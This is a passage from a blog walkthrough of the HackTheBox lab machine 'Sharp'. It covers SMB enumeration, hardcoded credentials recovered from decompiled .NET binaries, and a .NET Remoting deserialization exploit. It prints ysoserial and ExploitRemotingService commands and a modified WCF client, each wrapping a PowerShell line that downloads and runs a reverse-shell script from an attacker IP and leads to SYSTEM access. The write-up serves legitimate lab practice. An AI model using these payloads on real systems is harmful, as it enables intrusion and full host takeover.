SPIDER_P... 10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>        DIR: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;print$&#39;</span><span style="color:#f92672">]</span>
SPIDER_P... 10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>        EXT: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;ico&#39;</span>, <span style="color:#e6db74">&#39;lnk&#39;</span><span style="color:#f92672">]</span>
SPIDER_P... 10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>       SIZE: <span style="color:#ae81ff">51200</span>
SPIDER_P... 10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     OUTPUT: /tmp/cme_spider_plus
</code></pre></div><p>We made the <code>.json</code> more readable by filtering out the time and file size.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/kali/HackTheBox/Sharp<span style="color:#f92672">]</span>
â””â”€# cat 10.10.10.219_lars_spider.json | grep -v <span style="color:#e6db74">&#39;time\|size&#39;</span> | grep <span style="color:#e6db74">&#39;: {&#39;</span> | awk -F<span style="color:#ae81ff">\&#34;</span> <span style="color:#e6db74">&#39;{print $2}&#39;</span>  
IPC$			<span style="color:#75715e"># directory</span>
InitShutdown
LSM_API_service
PIPE_EVENTROOT<span style="color:#ae81ff">\\</span>CIMV2SCM EVENT PROVIDER
PSHost.132655164003465770.3392.DefaultAppDomain.powershell
W32TIME_ALT
Winsock2<span style="color:#ae81ff">\\</span>CatalogChangeListener-154-0
Winsock2<span style="color:#ae81ff">\\</span>CatalogChangeListener-1dc-0
Winsock2<span style="color:#ae81ff">\\</span>CatalogChangeListener-268-0
Winsock2<span style="color:#ae81ff">\\</span>CatalogChangeListener-274-0
Winsock2<span style="color:#ae81ff">\\</span>CatalogChangeListener-36c-0
Winsock2<span style="color:#ae81ff">\\</span>CatalogChangeListener-42c-0
atsvc
epmapper
eventlog
lsass
ntsvcs
scerpc
srvsvc
vgauth-service
wkssvc
dev				<span style="color:#75715e"># directory</span>
Client.exe
RemotingLibrary.dll
Server.exe
notes.txt
</code></pre></div><p>While searching <code>lars</code> files, only those in <code>\\dev</code> seem important.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/â€¦/HackTheBox/Sharp/smb/lars<span style="color:#f92672">]</span>
â””â”€# smbclient -U <span style="color:#e6db74">&#39;lars&#39;</span> //10.10.10.219/dev G123HHrth234gRG                                    <span style="color:#ae81ff">130</span> â¨¯
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Sun Nov <span style="color:#ae81ff">15</span> 06:30:13 <span style="color:#ae81ff">2020</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Nov <span style="color:#ae81ff">15</span> 06:30:13 <span style="color:#ae81ff">2020</span>
  Client.exe                          A     <span style="color:#ae81ff">5632</span>  Sun Nov <span style="color:#ae81ff">15</span> 05:25:01 <span style="color:#ae81ff">2020</span>
  notes.txt                           A       <span style="color:#ae81ff">70</span>  Sun Nov <span style="color:#ae81ff">15</span> 08:59:02 <span style="color:#ae81ff">2020</span>
  RemotingLibrary.dll                 A     <span style="color:#ae81ff">4096</span>  Sun Nov <span style="color:#ae81ff">15</span> 05:25:01 <span style="color:#ae81ff">2020</span>
  Server.exe                          A     <span style="color:#ae81ff">6144</span>  Mon Nov <span style="color:#ae81ff">16</span> 06:55:44 <span style="color:#ae81ff">2020</span>
  
<span style="color:#75715e"># notes.txt</span>
Todo:
    Migrate from .Net remoting to WCF	<span style="color:#75715e"># This might be our hint</span>
    Add input validation
</code></pre></div><p>Two executables <code>Client.exe</code> and <code>Server.exe</code>, as well as their library, are also built in C#  so we can decompile them with dnSpy.</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-02.png" alt=""></p>
<p>Then we have a <em>secret</em> endpoint listening on port <code>8888</code> with its username and password hardcoded in <code>Client.exe</code></p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-06.png" alt="Client.exe"></p>
<p>The credentials are to be tested with CME whether they are valid.</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-12.png" alt=""></p>
<h3 id="credentials-acquired-1">Credentials acquired<a href="#credentials-acquired-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<table>
<thead>
<tr>
<th>Username</th>
<th>Password</th>
<th>Status</th>
</tr>
</thead>
<tbody>
<tr>
<td>debug</td>
<td>SharpApplicationDebugUserPassword123!</td>
<td>Valid</td>
</tr>
<tr>
<td>Administrator</td>
<td>G2@$btRSHJYTarg</td>
<td>Invalid</td>
</tr>
<tr>
<td>lars</td>
<td>G123HHrth234gRG</td>
<td>Valid</td>
</tr>
</tbody>
</table>
<h2 id="exploit-local-net-debug-service">Exploit local .NET debug service<a href="#exploit-local-net-debug-service" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>As <code>debug</code> profile contains nothing but some useless folders (<code>IPC$</code>, <code>dev</code> and similarities for lars), we have to figure out how to connect to the endpoint on port 8888. Back to the <code>notes.txt</code>, I thought there is something to do with the .NET service and came across these two repos. You can take a look yourselves.</p>
<p><a href="https://github.com/tyranid/ExploitRemotingService">https://github.com/tyranid/ExploitRemotingService</a></p>
<blockquote>
<p>A tool to exploit .NET Remoting Services vulnerable to CVE-2014-1806 or CVE-2014-4149. It only works on Windows although some aspects <em>might</em> work in Mono on *nix.</p>
</blockquote>
<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a> (basically our payload wrapper)</p>
<blockquote>
<p><strong>ysoserial</strong> is a collection of utilities and property-oriented programming &ldquo;gadget chains&rdquo; discovered in common java libraries that can, under the right conditions, exploit Java applications performing <strong>unsafe deserialization</strong> of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host</p>
</blockquote>
<p>We will use <em>ysoserial</em> to wrap our reverse-tcp PowerShell one-liner<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> and call <em>ExploitRemotingService.exe</em> to pipe our wrapped payload into the mentioned vulnerable endpoint.</p>
<h3 id="payload-crafting-and-network-configuration">Payload crafting and Network configuration<a href="#payload-crafting-and-network-configuration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<h4 id="useful-poc2-repositories">Useful PoC<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> repositories<a href="#useful-poc2-repositories" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Because ExploitRemotingService doesn&rsquo;t provide us any release versions so we have to download and build the project manually with Visual Studio on our Windows VM<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>.</p>
<p>Additionally, I have to install <a href="http://www.ndesk.org/Options">NDesk Options</a> library in order to successfully compile the solution.</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_11-27.png" alt=""></p>
<p><code>ysoserial</code> has their portable version so we can simply download, unzip and use it.</p>
<p>Here is a brief look of <code>Server.exe</code> source code decompiled by dnSpy. The server is running on port <code>8888</code> with BinaryFormatter sink implemented. You can read about the details <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.remoting.channels.binaryserverformattersink?view=netframework-4.8">here</a>; simply put, we just need <code>ysoserial</code> to wrap our payload in BinaryFormatter mode.</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_11-41.png" alt=""></p>
<p>Below is our crafting steps with <code>ysoserial</code> and <code>ExploitRemotingService</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">### ysoserial.exe</span>
C:\Users\User\Desktop\ysoserial-1.34\Release&gt;ysoserial.exe <span style="color:#f92672">-f</span> BinaryFormatter -g TypeConfuseDelegate -o base64 -c <span style="color:#e6db74">&#34;powershell IEX(new-object net.webclient).downloadString(&#39;http://10.10.16.3/reverse.ps1&#39;)&#34;</span>

<span style="color:#75715e"># Breakdown</span>
<span style="color:#f92672">-f</span> Formatter as BinaryFormatter
-g TypeConfuseDelegate gadget
-o Base64 output
-c Create a reverse connection back to our IP using Powershell one-liner called reverse.ps1
IEX(New-Object Net.WebClient).downloadString(<span style="color:#e6db74">&#39;http://10.10.16.3/reverse.ps1&#39;</span>)


<span style="color:#75715e">### ExploitRemotingService.exe</span>
C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Release&gt;ExploitRemotingService.exe -s --user=debug --pass=<span style="color:#e6db74">&#34;SharpApplicationDebugUserPassword123!&#34;</span> tcp<span style="color:#960050;background-color:#1e0010">:</span>//10.10.10.219<span style="color:#960050;background-color:#1e0010">:</span>8888/SecretSharpDebugApplicationEndpoint raw &lt;wrapped payload&gt;
</code></pre></div><h4 id="network-re-routing-on-windows-and-linux">Network re-routing on Windows and Linux<a href="#network-re-routing-on-windows-and-linux" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Before we can send our payload to target host, remember that currently our Linux machine is the only one can connect to HTB VPN, not our Windows. In order to establish a connection between Windows and HTB VPN, we have to do some routing.</p>
<p>The following section helps us turn Kali into a router and act as the gateway.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Windows</span>
<span style="color:#75715e"># We want to route any HTB connection to our Kali machine NAT-IP</span>
C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;route add 10.10.10.0 mask 255.255.255.0 192.168.157.133
 OK!

<span style="color:#75715e">#	----------------------------------------------</span>

<span style="color:#75715e"># Linux</span>
<span style="color:#75715e"># Enable IP Forwarding</span>
$ echo <span style="color:#ae81ff">1</span> | sudo tee /proc/sys/net/ipv4/ip_forward 

<span style="color:#75715e"># Configurate iptables&#39; rules to manage incomming packets</span>
<span style="color:#75715e"># This rule forwards packets from HTB to our Windows machine</span>
<span style="color:#75715e"># Breakdown: Forwarding chain for connection from tun0 to eth0 interface with related and/or established state</span>
$ iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT 

<span style="color:#75715e"># Accept packets sending back from Windows machine</span>
<span style="color:#75715e"># Breakdown: Receive packets from Windows through eth0 interface then pass it on tun0 and send them to HTB</span>
$ iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT

<span style="color:#75715e"># Re-routing NAT from HTB machine back to Windows</span>
<span style="color:#75715e"># Breakdown: Create a NAT table with POSTROUTING chain that accept only IP from the source of eth0 and pass it through tun0 with MASQUERADE policy</span>
$ iptables -t nat -A POSTROUTING -s 192.168.157.0/24 -o tun0 -j MASQUERADE 
</code></pre></div><h3 id="powershell-reverse-connection">PowerShell Reverse Connection<a href="#powershell-reverse-connection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Finally, our Windows is able to send/receive packets from HTB machine through Kali.</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_12-49.png" alt=""></p>
<p>Now we can send our payload to target remote host and wait for our reverse shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">### ExploitRemotingService.exe</span>
C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\U</span>ser<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\E</span>xploitRemotingService-master<span style="color:#ae81ff">\E</span>xploitRemotingService<span style="color:#ae81ff">\b</span>in<span style="color:#ae81ff">\R</span>elease&gt;ExploitRemotingService.exe -s --user<span style="color:#f92672">=</span>debug --pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SharpApplicationDebugUserPassword123!&#34;</span> tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw &lt;wrapped payload&gt;
</code></pre></div><p>After execute the above command, we has established a reverse PowerShell as user <code>lars</code>.</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_13-17.png" alt=""></p>
<p>Browsing through <code>lars</code> directories, there is a <code>wcf</code> folder in Documents. This has also been mentioned in <code>notes.txt</code> about migrating the project from dotNET to WCF, so it might be the answer. Anyway, the machine&rsquo;s user flag is located in <code>C:\Users\lars\Desktop\user.txt</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\lars\Documents\wcf


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>40 PM                .vs                                                                   
d-----       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>40 PM                Client                                                                
d-----       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>40 PM                packages                                                              
d-----       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>40 PM                RemotingLibrary                                                       
d-----       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>41 PM                Server                                                                
-a----       11/15/2020  12<span style="color:#960050;background-color:#1e0010">:</span>47 PM           2095 wcf.sln                                                               


PS C:\Users\lars\Documents\wcf&gt; 
</code></pre></div><p>Let&rsquo;s compress the wcf directory into <code>wcf.zip</code> then download it to our Linux shared directory</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-09.png" alt=""></p>
<h3 id="another-secret-endpoint-and-flag">Another secret endpoint and &hellip;flag!<a href="#another-secret-endpoint-and-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>It turns out <code>wcf.zip</code> is also a C# project with source code inside, we can put it in Visual Studio and view the source. There is another secret endpoint that is currently running on port 8889 of the remote host.</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-22.png" alt=""></p>
<p>Since we are in the same network with remote target, you can try change the IP to the machine (10.10.10.219) and run the code. But there is a problem.</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-29.png" alt=""></p>
<p>We can&rsquo;t connect to our target because of invalid credentials. This program was meant to run as internal users of the remote host (like <code>lars</code> or <code>debug</code>). To impersonate <code>lars</code>, we will run our command-prompt with his net-username as following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Also type lars password when prompted</span>
C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;runas /user:lars /netonly %ComSpec%
</code></pre></div><p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-33.png" alt=""></p>
<p>Now we are <code>lars</code> in his server, move to our malformed <code>wcf</code> project and run it again.</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-36.png" alt=""></p>
<p>Successfully executed as <code>lars</code>. Now we will use the project&rsquo;s built-in function <code>InvokePowerShell</code> to escalate our privilege.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> InvokePowerShell(<span style="color:#66d9ef">string</span> scriptText)
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(scriptText);
            pipeline.Commands.Add(<span style="color:#e6db74">&#34;Out-String&#34;</span>);
            Collection &lt;PSObject&gt; results = pipeline.Invoke();
            runspace.Close();
            StringBuilder stringBuilder = <span style="color:#66d9ef">new</span> StringBuilder();
            <span style="color:#66d9ef">foreach</span> (PSObject obj <span style="color:#66d9ef">in</span> results)
            {
                stringBuilder.AppendLine(obj.ToString());
            }
            <span style="color:#66d9ef">return</span> stringBuilder.ToString();
        }
    }
</code></pre></div><p><code>Client.cs</code> is to be changed as below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">namespace</span> Client {

    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Client</span>
    {
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main() {
            ChannelFactory&lt;IWcfService&gt; channelFactory = <span style="color:#66d9ef">new</span> ChannelFactory&lt;IWcfService&gt;(
                <span style="color:#66d9ef">new</span> NetTcpBinding(SecurityMode.Transport),<span style="color:#e6db74">&#34;net.tcp://10.10.10.219:8889/wcf/NewSecretWcfEndpoint&#34;</span>
            );
            IWcfService client = channelFactory.CreateChannel();
            Console.WriteLine(client.InvokePowerShell(<span style="color:#e6db74">&#34;IEX(New-Object Net.WebClient).downloadString(&#39;10.10.16.3/reverse.ps1&#39;)&#34;</span>));
        }
    }
</code></pre></div><p>Re-build the project then execute <code>Client.exe</code> as <code>lars</code> gives us our reverse shell as <code>nt-authority system</code></p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-46.png" alt=""></p>
<p>And the flag is located in <code>C:\Users\Administrator\Desktop\root.txt</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">cd C:\Users\Administrator
dir


    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\Administrator


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
d-r---       11/12/2020   5<span style="color:#960050;background-color:#1e0010">:</span>15 PM                3D Objects                                                             
d-r---       11/12/2020   5<span style="color:#960050;background-color:#1e0010">:</span>15 PM                Contacts                                                               
d-r---       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>42 PM                Desktop                                                                
d-r---       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>46 PM                Documents                                                              
d-r---       11/12/2020   5<span style="color:#960050;background-color:#1e0010">:</span>15 PM                Downloads                                                              
d-r---       11/12/2020   5<span style="color:#960050;background-color:#1e0010">:</span>15 PM                Favorites                                                              
d-r---       11/12/2020   5<span style="color:#960050;background-color:#1e0010">:</span>15 PM                Links                                                                  
d-r---       11/12/2020   5<span style="color:#960050;background-color:#1e0010">:</span>15 PM                Music                                                                  
d-r---       11/12/2020   5<span style="color:#960050;background-color:#1e0010">:</span>15 PM                Pictures                                                               
d-r---       11/12/2020   5<span style="color:#960050;background-color:#1e0010">:</span>15 PM                Saved Games                                                            
d-r---       11/12/2020   5<span style="color:#960050;background-color:#1e0010">:</span>15 PM                Searches                                                               
d-r---       11/12/2020   5<span style="color:#960050;background-color:#1e0010">:</span>15 PM                Videos                                                                 


cd Desktop
dir


    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-ar---        5/14/2021   6<span style="color:#960050;background-color:#1e0010">:</span>02 AM             34 root.txt                                                               


cat root.txt
<span style="color:#66d9ef">[REDACTED]</span>
PS C:\Users\Administrator\Desktop&gt; 
</code></pre></div><h2 id="footnotes">Footnotes<a href="#footnotes" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>See more about PowerShell one-liner: <a href="https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf">https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>Proof of Concept&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p>Virtual Machine&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        <span class="button previous">
            <a href="https://legiahuyy.github.io/blog/en/posts/readme/">
                <span class="button__icon">â†</span>
                <span class="button__text">A README.md</span>
            </a>
        </span>
        
        
        <span class="button next">
            <a href="https://legiahuyy.github.io/blog/en/posts/htb-thenotebook/">
                <span class="button__text">HackTheBox: The Notebook</span>
                <span class="button__icon">â†’</span>
            </a>
        </span>
        
    </div>
</div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>Â© 2022 The Archivist</a>.</span>
    
        <span>All posts are licensed under <a href="https://creativecommons.org/licenses/by/4.0/legalcode">CC BY 4.0</a>.</span>
      </div>
  </div>
</footer>

<script src="https://legiahuyy.github.io/blog/en/assets/main.js"></script>
<script src="https://legiahuyy.github.io/blog/en/assets/prism.js"></script>





<script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>


<script>
const images = Array.from(document.querySelectorAll(".post-content img"));
images.forEach(img => {
  mediumZoom(img, {
    margin: 0,  
    background: '#222129',
    scrollOffset: 40,  
    container: null,  
    template: null  
  });
});
</script>


  
</div>

</body>
</html>
